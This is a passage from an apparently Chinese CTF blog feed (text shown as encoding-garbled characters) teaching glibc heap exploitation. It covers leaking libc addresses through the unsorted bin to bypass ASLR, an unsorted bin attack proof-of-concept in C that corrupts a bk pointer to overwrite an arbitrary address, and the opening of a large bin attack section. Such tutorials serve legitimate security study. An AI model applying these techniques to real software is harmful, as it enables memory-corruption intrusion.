<code>__malloc_hook</code> æ˜¯è¿åœ¨ä¸€èµ·çš„ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A861.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨61.png"></p><hr><h1 id="Unsorted-bin-Attack"><a href="#Unsorted-bin-Attack" class="headerlink" title="Unsorted bin Attack"></a>Unsorted bin Attack</h1><blockquote><p>Unsorted bin Attack æ˜¯ä¸€ç±»æ¼æ´çš„åˆ©ç”¨æ–¹æ³•ï¼Œæ˜¯æŒ‡æ‰€æœ‰åŸºäº <code>unsorted bin</code> æœºåˆ¶çš„æ¼æ´åˆ©ç”¨æ–¹æ³•</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/#unsorted-bin">Unsorted Bin Attack - CTF Wiki</a></p></blockquote><p>Unsorted bin Attack çš„åˆ©ç”¨å‰æï¼š</p><ul><li>æ§åˆ¶ <code>unsorted bin chunk</code> çš„ <code>bk</code> æŒ‡é’ˆ</li></ul><p>Unsorted bin Attack å¯ä»¥è¾¾åˆ°çš„æ•ˆæœæ˜¯ï¼š<strong>å®ç°ä¿®æ”¹ä»»æ„åœ°å€å€¼ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ•°å€¼</strong></p><hr><h2 id="Unsorted-bin-Leak"><a href="#Unsorted-bin-Leak" class="headerlink" title="Unsorted bin Leak"></a>Unsorted bin Leak</h2><blockquote><p><code>unsorted bin</code> é¦–å…ˆå¯ä»¥ç”¨æ¥<strong>æ³„éœ²ä¸€äº›ä¿¡æ¯</strong></p></blockquote><p>ç”±äº <code>unsorted bin</code>Â åœ¨ç®¡ç†æ—¶ä¸ºå¾ªç¯åŒå‘é“¾è¡¨ï¼Œè‹¥Â <code>unsorted bin</code>Â ä¸­æœ‰ä¸¤ä¸ªÂ <code>bin</code>ï¼Œé‚£ä¹ˆè¯¥é“¾è¡¨ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A862.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨62.png"></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨è¯¥é“¾è¡¨ä¸­å¿…æœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆä¸å‡†ç¡®çš„è¯´ï¼Œæ˜¯å°¾èŠ‚ç‚¹ï¼Œè¿™ä¸ªå°±æ„ä¼šä¸€ä¸‹æŠŠï¼Œæ¯•ç«Ÿå¾ªç¯é“¾è¡¨å®é™…ä¸Šæ²¡æœ‰å¤´å°¾ï¼‰çš„Â <code>fd</code>Â æŒ‡é’ˆä¼šæŒ‡å‘Â <code>main_arena</code>Â ç»“æ„ä½“å†…éƒ¨</p><p>å¦‚æœæˆ‘ä»¬å¯ä»¥æŠŠæ­£ç¡®çš„Â <code>fd</code>Â æŒ‡é’ˆæ³„éœ²å‡ºæ¥ï¼Œå°±å¯ä»¥è·å¾—ä¸€ä¸ªä¸Â <code>main_arena</code>Â æœ‰å›ºå®šåç§»çš„åœ°å€ï¼Œè¿™ä¸ªåç§»å¯ä»¥é€šè¿‡ GDB è°ƒè¯•å¾—å‡º</p><blockquote><p><code>main_arena</code>Â æ˜¯ä¸€ä¸ªÂ <code>struct malloc_state</code>Â ç±»å‹çš„å…¨å±€å˜é‡ï¼Œæ˜¯Â <code>ptmalloc2</code>Â ç®¡ç†ä¸»åˆ†é…åŒºçš„å”¯ä¸€å®ä¾‹ï¼Œå…¶ä¼šè¢«åˆ†é…åœ¨Â <code>.data</code>Â æˆ–è€…Â <code>.bss</code>Â ç­‰æ®µä¸Š</p><p><strong>å¦‚æœæˆ‘ä»¬æœ‰è¿›ç¨‹æ‰€ä½¿ç”¨çš„Â <code>libc.so</code>Â æ–‡ä»¶çš„è¯ï¼Œå°±å¯ä»¥è·å¾—Â <code>main_arena</code>Â ä¸Â libcÂ åŸºåœ°å€çš„åç§»ï¼Œå®ç°å¯¹Â <code>ASLR</code>Â çš„ç»•è¿‡</strong></p></blockquote><p>è·å¾—Â <code>main_arena</code>Â ä¸Â libcÂ åŸºåœ°å€çš„åç§»ä¸»è¦æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><ul><li>é€šè¿‡ <code>__malloc_trim</code> å‡½æ•°å¾—å‡º  </li><li>é€šè¿‡ <code>__malloc_hook</code> ç›´æ¥è®¡ç®—</li></ul><p>ä¸€èˆ¬æ¥è¯´ï¼Œè¦å®ç° Unsorted bin Leakï¼Œéœ€è¦æœ‰Â UAF</p><blockquote><p>åœ¨ CTF ä¸­ï¼Œä¸€èˆ¬çš„ç¬”è®°ç®¡ç†é¢˜éƒ½ä¼šæœ‰Â <code>show</code>Â çš„åŠŸèƒ½ï¼Œå¯¹<strong>å¤„äº unsorted bin é“¾è¡¨å°¾çš„èŠ‚ç‚¹</strong>Â <code>show</code>Â å°±å¯ä»¥è·å¾—Â <code>libc</code>Â çš„åŸºåœ°å€äº†</p><p>å¦å¤–ï¼ŒCTFÂ ä¸­å †å¾€å¾€æ˜¯åˆšåˆšåˆå§‹åŒ–çš„ï¼Œæ‰€ä»¥Â <code>unsorted bin</code>Â ä¸€èˆ¬éƒ½æ˜¯å¹²å‡€çš„ï¼Œ<mark>å½“Â <code>unsorted bin</code>Â ä¸­åªå­˜åœ¨ä¸€ä¸ªÂ <code>bin</code>Â çš„æ—¶å€™ï¼Œè¯¥Â <code>bin</code>Â çš„Â <code>fd</code>Â å’ŒÂ <code>bk</code>Â éƒ½ä¼šæŒ‡å‘Â <code>main_arena</code>Â ä¸­</mark></p></blockquote><p>å¦å¤–ï¼Œ<strong>å¦‚æœæˆ‘ä»¬æ— æ³•åšåˆ°è®¿é—®é“¾è¡¨å°¾ï¼Œä½†æ˜¯å¯ä»¥è®¿é—®é“¾è¡¨å¤´</strong>ï¼š</p><ul><li>åœ¨ 32 ä½çš„ç¯å¢ƒä¸‹ï¼Œå¯¹é“¾è¡¨å¤´è¿›è¡ŒÂ <code>printf</code>Â ç­‰æ“ä½œï¼Œå¾€å¾€å¯ä»¥æŠŠÂ <code>fd</code>Â å’ŒÂ <code>bk</code>Â ä¸€èµ·è¾“å‡ºå‡ºæ¥ï¼Œè¿™ä¸ªæ—¶å€™åŒæ ·å¯ä»¥å®ç°æœ‰æ•ˆçš„ leak  </li><li>åœ¨ 64 ä½çš„ç¯å¢ƒä¸‹ï¼Œç”±äºé«˜åœ°å€å¾€å¾€ä¸ºÂ <code>\x00</code>ï¼Œå¾ˆå¤šè¾“å‡ºå‡½æ•°ä¼šè¢«æˆªæ–­ï¼Œè¿™ä¸ªæ—¶å€™å¯èƒ½å°±éš¾ä»¥å®ç°æœ‰æ•ˆçš„ leak</li></ul><hr><h3 id="é€šè¿‡-malloc-trim-å¾—åˆ°åç§»"><a href="#é€šè¿‡-malloc-trim-å¾—åˆ°åç§»" class="headerlink" title="é€šè¿‡ __malloc_trim() å¾—åˆ°åç§»"></a>é€šè¿‡ __malloc_trim() å¾—åˆ°åç§»</h3><p>åœ¨Â <code>malloc.c</code>Â ä¸­æœ‰è¿™æ ·ä¸€æ®µä»£ç ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span><span class="token function">__malloc_trim</span> <span class="token punctuation">(</span>size_t s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>__malloc_initialized <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token function">ptmalloc_init</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  mstate ar_ptr <span class="token operator">=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">;</span>   <span class="token comment">// &lt;= here!</span>  <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>      <span class="token function">__libc_lock_lock</span> <span class="token punctuation">(</span>ar_ptr<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">|=</span> <span class="token function">mtrim</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__libc_lock_unlock</span> <span class="token punctuation">(</span>ar_ptr<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>      ar_ptr <span class="token operator">=</span> ar_ptr<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>ar_ptr <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„åˆ°Â <code>mstate ar_ptr = &amp;main_arena</code>Â è¿™é‡Œå¯¹Â <code>main_arena</code>Â è¿›è¡Œäº†è®¿é—®ï¼Œæ‰€ä»¥<strong>é€šè¿‡ IDA åˆ†æ libc æ–‡ä»¶ä¸­çš„ <code>malloc_trim()</code> å‡½æ•°å°±å¯ä»¥å¾—åˆ° libc åç§»äº†</strong></p><p>ä»¥ Glibc 2.23 ä¸­çš„ <code>malloc_trim()</code> å‡½æ•°ä¸ºä¾‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A863.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨63.png"></p><p>å…¶ä½äº <code>.bss</code> æ®µä¸Šï¼Œå¯è§ <code>main_arena</code>Â ä¸Â libcÂ åŸºåœ°å€çš„åç§»ä¸º <code>0x3C4B20</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A864.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨64.png"></p><p>æˆ‘ä»¬ä»¥ ã€Š<a href="%E3%80%90Asis%20CTF%202016%E3%80%91b00ks.md">ã€Asis CTF 2016ã€‘b00ks</a>ã€‹ ä¸€æ–‡ä¸­æ³„æ¼çš„åœ°å€æ¥è¿›è¡ŒéªŒè¯ï¼šï¼ˆåŒä¸º Glibc 2.23 ç¯å¢ƒï¼‰</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks34.png" alt="ã€Asis CTF 2016ã€‘b00ks34.png"></p><p><code>main_arena</code>Â ä¸Â libcÂ åŸºåœ°å€çš„åç§»ä¸ºï¼š<code>0x7efea8cc9b20 - 0x7efea8905000 = 0x3c4b20</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A865.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨65.png"></p><hr><h3 id="é€šè¿‡-malloc-hook-è®¡ç®—åç§»"><a href="#é€šè¿‡-malloc-hook-è®¡ç®—åç§»" class="headerlink" title="é€šè¿‡ __malloc_hook è®¡ç®—åç§»"></a>é€šè¿‡ __malloc_hook è®¡ç®—åç§»</h3><p><code>main_arena</code>Â å’ŒÂ <code>__malloc_hook</code>Â çš„åœ°å€å·®æ˜¯ 0x10ï¼Œè€Œå¤§å¤šæ•°çš„ libc éƒ½å¯ä»¥ç›´æ¥æŸ¥å‡ºÂ <code>__malloc_hook</code>Â çš„åœ°å€</p><p>å› æ­¤Â <code>main_arena</code>Â ä¸Â libcÂ åŸºåœ°å€çš„åç§»å¯ä»¥ç›´æ¥å¾—åˆ°ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">main_arena_offset <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Unsorted-bin-Attack-1"><a href="#Unsorted-bin-Attack-1" class="headerlink" title="Unsorted bin Attack"></a>Unsorted bin Attack</h2><p>åœ¨ <code>glibc/malloc/malloc.c</code> ä¸­çš„ <code>_int_malloc</code> æœ‰è¿™ä¹ˆä¸€æ®µä»£ç ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* remove from unsorted list */</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): corrupted unsorted chunks 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>bck<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“å°†ä¸€ä¸ª <code>unsorted bin</code> å–å‡ºçš„æ—¶å€™ï¼Œä¼šå°† <code>bck -&gt; fd</code> çš„ä½ç½®å†™å…¥æœ¬ <code>unsorted bin</code> çš„ä½ç½®</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>å¦‚æœæˆ‘ä»¬æ§åˆ¶äº† <code>bk</code> çš„å€¼ï¼Œå°±èƒ½å°†Â <code>unsorted_chunks (av)</code>Â å†™åˆ°ä»»æ„åœ°å€</strong></p><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> target_var <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p: %ld\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>target_var<span class="token punctuation">,</span> target_var<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"bk pointer point to %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/*------------VULNERABILITY-----------*/</span>  p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>target_var <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//------------------------------------</span>  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>target_var<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>target_var<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€šè¿‡ GDB è°ƒè¯•åˆ†æä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹</p><p>é¦–å…ˆåˆ†é…äº†ä¸¤ä¸ªå †å— <code>chunk1</code> å’Œ <code>chunk2</code>ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå †å—ç”¨æ¥é˜²æ­¢ä¸ <code>top chunk</code> åˆå¹¶</p><p>ç„¶åé‡Šæ”¾ <code>chunk1</code>ï¼Œå°†å…¶ç½®äº <code>unsorted bin</code> ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å…¶ <code>bk</code> æŒ‡é’ˆæŒ‡å‘ <code>0x00007ffff7dd1b78</code>ï¼Œç”±äºæ­¤æ—¶ <code>unsorted bin</code> åªæœ‰ä¸€ä¸ªï¼Œå› æ­¤ <code>fd</code> ä¸ <code>bk</code> æŒ‡é’ˆç›¸åŒ</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A866.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨66.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A873.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨73.png"></p><p>å‡è®¾æˆ‘ä»¬é€šè¿‡å †æº¢å‡ºæˆ–å…¶ä»–æ‰‹æ®µä¿®æ”¹ <code>bk</code> æŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘ <code>target_var - 16</code> çš„ä½ç½®ï¼ˆè¿™é‡Œæ˜¯ä»¥ 64 ä½ç¨‹åºä½œä¸ºç¤ºä¾‹ï¼Œå¦‚æœæ˜¯ 32 ä½ç¨‹åºï¼Œåˆ™æŒ‡å‘ <code>target_var - 8</code> çš„ä½ç½®ï¼‰</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A867.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨67.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A872.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨72.png"></p><p><code>target_var - 16</code> å¤„æ˜¯æˆ‘ä»¬ä¼ªé€ çš„ <code>chunk</code>ï¼Œå³ï¼š<code>target_var</code> å¤„äºä¼ªé€  <code>chunk</code> çš„ <code>fd</code> å¤„</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A868.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨68.png"></p><p>ç„¶åï¼Œæˆ‘ä»¬é€šè¿‡ <code>malloc(400)</code> å†æ¬¡ç”³è¯·ç›¸åŒå¤§å°çš„ç©ºé—´</p><p>ç”±äºæ‰€ç”³è¯·çš„ <code>chunk</code> å¤„äº <code>small bin</code> æ‰€åœ¨çš„èŒƒå›´ï¼Œå…¶å¯¹åº”çš„ <code>bin</code> ä¸­æš‚æ—¶æ²¡æœ‰ <code>chunk</code>ï¼Œæ‰€ä»¥ä¼šå» <code>unsorted bin</code> ä¸­æ‰¾ï¼Œå‘ç° <code>unsorted bin</code> ä¸ä¸ºç©ºï¼Œäºæ˜¯æŠŠ <code>unsorted bin</code> ä¸­çš„æœ€åä¸€ä¸ª <code>chunk</code> å–å‡ºæ¥ï¼Œè€Œ <code>unsorted bin</code> ä¸­çš„æœ€åä¸€ä¸ª <code>chunk</code> æ˜¯æˆ‘ä»¬ä¼ªé€ çš„ <code>chunk</code></p><p>æ­¤æ—¶å †å¹¶æ²¡æœ‰ä»€ä¹ˆæ”¹å˜ï¼Œä¾ç„¶æ˜¯ <code>unsorted bin</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A869.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨69.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A871.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨71.png"></p><p>ä½†æ˜¯ <code>0x7fffffffdc88</code>ï¼ˆ<code>target_var</code>ï¼‰åœ°å€å¤„å·²ç»è¢«ä¿®æ”¹ä¸ºÂ <code>unsorted bin</code> çš„é“¾è¡¨å¤´éƒ¨ <code>0x00007ffff7dd1b78</code>ï¼Œå³ <code>fd</code> æŒ‡é’ˆï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A870.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨70.png"></p><blockquote><p>æ³¨æ„ï¼š</p><p>è™½ç„¶æˆ‘ä»¬ä¿®æ”¹äº†Â <code>target</code> å¤„çš„å€¼ï¼Œä½† <code>unsorted bin</code> é“¾è¡¨ä¹Ÿå¯èƒ½å°±æ­¤ç ´åï¼Œåœ¨æ’å…¥ <code>chunk</code> æ—¶ï¼Œå¯èƒ½ä¼šå‡ºç°é—®é¢˜</p></blockquote><p>ä»ä¸Šé¢çš„ç¤ºä¾‹æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<strong>Unsorted bin Attack ç¡®å®å¯ä»¥ä¿®æ”¹ä»»æ„åœ°å€çš„å€¼ï¼Œä½†æ˜¯æ‰€ä¿®æ”¹æˆçš„å€¼å´ä¸å—æˆ‘ä»¬æ§åˆ¶ï¼Œå”¯ä¸€å¯ä»¥çŸ¥é“çš„æ˜¯ï¼Œè¿™ä¸ªå€¼æ¯”è¾ƒå¤§</strong>ï¼Œä¸€èˆ¬å¯ä»¥ä½œä¸ºä»¥ä¸‹ç”¨é€”ï¼š</p><ul><li>æˆ‘ä»¬é€šè¿‡ä¿®æ”¹å¾ªç¯çš„æ¬¡æ•°æ¥ä½¿å¾—ç¨‹åºå¯ä»¥æ‰§è¡Œå¤šæ¬¡å¾ªç¯  </li><li>æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ <code>heap</code> ä¸­çš„ <code>global_max_fast</code> æ¥ä½¿å¾—æ›´å¤§çš„ <code>chunk</code> å¯ä»¥è¢«è§†ä¸º <code>fast bin</code>ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å»æ‰§è¡Œä¸€äº› <code>fast bin attack</code> äº†</li></ul><hr><h1 id="Large-bin-Attack"><a href="#Large-bin-Attack" class="headerlink" title="Large bin Attack"></a>Large bin Attack</h1><blockquote><p>Large bin Attack æ˜¯ä¸€ç±»æ¼æ´çš„åˆ©ç”¨æ–¹æ³•ï¼Œæ˜¯æŒ‡æ‰€æœ‰åŸºäº <code>large bin</code> æœºåˆ¶çš„æ¼æ´åˆ©ç”¨æ–¹æ³•</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/">Large Bin Attack - CTF Wiki</a></p></blockquote><p>Large bin Attack ä¸»è¦åˆ©ç”¨çš„æ˜¯ <code>chunk</code> è¿›å…¥ <code>bin</code> ä¸­çš„æ“ä½œï¼Œåœ¨ <code>malloc</code> çš„æ—¶å€™ï¼Œéå† <code>unsorted bin</code> æ—¶ï¼Œå¯¹æ¯ä¸€ä¸ª <code>chunk</code>ï¼Œè‹¥æ— æ³• <code>exact-fit</code> åˆ†é…æˆ–ä¸æ»¡è¶³åˆ‡å‰²åˆ†é…çš„æ¡ä»¶ï¼Œå°±ä¼šå°†è¯¥ <code>chunk</code> ç½®å…¥ç›¸åº”çš„ <code>bin</code> ä¸­ï¼Œè€Œæ­¤è¿‡ç¨‹ä¸­ç¼ºä¹å¯¹ <code>large bin</code> çš„è·³è¡¨æŒ‡é’ˆçš„æ£€æµ‹</p>]]></content>
    
    
    <summary type="html">ä¸»è¦ä»‹ç»äº†å †çš„ä¸€äº›å¸¸è§æ¼æ´å’Œåˆ©ç”¨æ–¹æ³•</summary>
    
    
    
    <category term="äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Androidé€†å‘ä¸åŠ¨æ€è°ƒè¯•</title>
    <link href="https://www.uf4te.cn/posts/13f0410d.html"/>
    <id>https://www.uf4te.cn/posts/13f0410d.html</id>
    <published>2024-05-23T15:45:58.000Z</published>
    <updated>2024-06-05T06:35:13.000Z</updated>
    
